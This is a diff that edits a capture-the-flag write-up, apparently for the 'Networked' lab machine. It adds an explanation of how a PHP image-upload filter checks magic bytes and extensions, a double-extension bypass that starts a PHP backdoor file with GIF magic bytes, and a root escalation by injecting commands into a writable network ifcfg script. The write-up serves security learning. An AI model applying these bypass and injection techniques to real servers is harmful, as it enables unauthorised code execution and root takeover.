@@ -115,8 +115,27 @@ if( isset($_POST['submit']) ) {
       }
     }
 
-~~~
+    if (!($valid)) {
+      echo "<p>Invalid image file</p>";
+      displayform();
+      exit;
+    }
+    $name = str_replace('.','_',$_SERVER['REMOTE_ADDR']).'.'.$ext;
 
+    $success = move_uploaded_file($myFile["tmp_name"], UPLOAD_DIR . $name);
+    if (!$success) {
+        echo "<p>Unable to save file.</p>";
+        exit;
+    }
+    echo "<p>file uploaded, refresh gallery</p>";
+
+    // set proper permissions on the new file
+    chmod(UPLOAD_DIR . $name, 0644);
+  }
+} else {
+  displayform();
+}
+?>
 {% endhighlight %}
 {% highlight shell %}
 root@kali:~# cat lib.php 
@@ -150,6 +169,17 @@ function file_mime_type($file) {
 
 ~~~
 
+function check_file_type($file) {
+  $mime_type = file_mime_type($file);
+  if (strpos($mime_type, 'image/') === 0) {
+      return true;
+  } else {
+      return false;
+  }
+}
+
+~~~
+
 function getnameUpload($filename) {
   $pieces = explode('.',$filename);
   $name= array_shift($pieces);
@@ -160,14 +190,16 @@ function getnameUpload($filename) {
 
 ~~~
 
-_{% endhighlight %}
+{% endhighlight %}
 
-In summerize, they are just checking the following.
-1. Magic bytes of each file to be uploaded.
-2. extension of each file to be uploaded.<br>
+In summerize, what "upload.php" is doing the followings.
+1. Check if the uploaded file is valid with "check_file_type()".
+2. "check_file_type()" checks the magic bytes of the file with "check_mime_type()".
+3. Check the extension of the uploaded file
+4. If these are OK, move the uploaded file from the temporary directory to "/uploads"
 
-This means, by using double extention method, we can bypass the filter.
-{% highlight php %}
+This means, by using double extention method, with adding appropriate magic bytes, we can bypass the filter.
+{% highlight shell %}
 root@kali:~# cat simple-backdoor.php.gif
 GIF89a
 <!-- Simple PHP backdoor by DK (http://michaeldaw.org) -->
@@ -400,7 +432,7 @@ test
 test
 ERROR     : [/etc/sysconfig/network-scripts/ifup-eth] Device guly0 does not seem to be present, delaying initialization.
 [guly@networked ~]$ 
-{% endhiglight %}
+{% endhighlight %}
 
 Command output:
 {% highlight shell %}
@@ -416,8 +448,14 @@ BOOTPROTO=test
 [guly@networked ~]$ 
 {% endhighlight %}
 
+To find a way to pwn this script, we can google like following.<br>
+We can find a <a href="https://seclists.org/fulldisclosure/2019/Apr/24">discussion of seclist.org</a> about getting root through network-scripts.
+{% highlight shell %}
+linux ifcfg script code execution full disclosure
+{% endhighlight %}
 
-If we put some spaces in the input, we can find interesting lines.
+According to this discussion, Redhat/CentOS has a vulnerability that if we have write permission for ifcf script in "/etc/sysconfig/network-scripts", we can achieve a root privilege of the host.<br>
+So try to put some spaces in the input. we can find interesting lines.
 {% highlight shell %}
 /etc/sysconfig/network-scripts/ifcfg-guly: line 4: y: command not found
 {% endhighlight %}
